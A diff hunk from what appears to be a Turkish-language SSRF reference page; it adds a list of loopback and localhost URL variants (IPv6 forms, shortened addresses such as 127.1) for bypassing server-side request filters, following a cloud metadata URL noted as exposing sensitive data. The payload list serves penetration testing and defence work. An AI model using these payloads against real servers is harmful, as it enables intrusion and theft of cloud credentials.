@@ -35,4 +35,27 @@ http://169.254.169.254/latest/meta-data/
 
 Bu, AWS EC2 meta veri hizmetinden hassas bilgileri alır.
 
+# Filtreleri atlamak
+http://localhost:80
+http://localhost:22
+https://localhost:443
+http://127.0.0.1:80
+http://127.0.0.1:22
+https://127.0.0.1:443
+http://0.0.0.0:80
+http://0.0.0.0:22
+https://0.0.0.0:443
+http://[::]:80/
+http://[0000::1]:80/
+http://[0:0:0:0:0:ffff:127.0.0.1]
+http://[::ffff:127.0.0.1]
+http://127.127.127.127
+http://127.0.1.3
+http://127.0.0.0
+http://0/
+http://127.1
+http://127.0.1
+```
 
+Prefix/Suffix tabanlı bypasslar ve URL manipülasyon teknikleri için:
+- https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
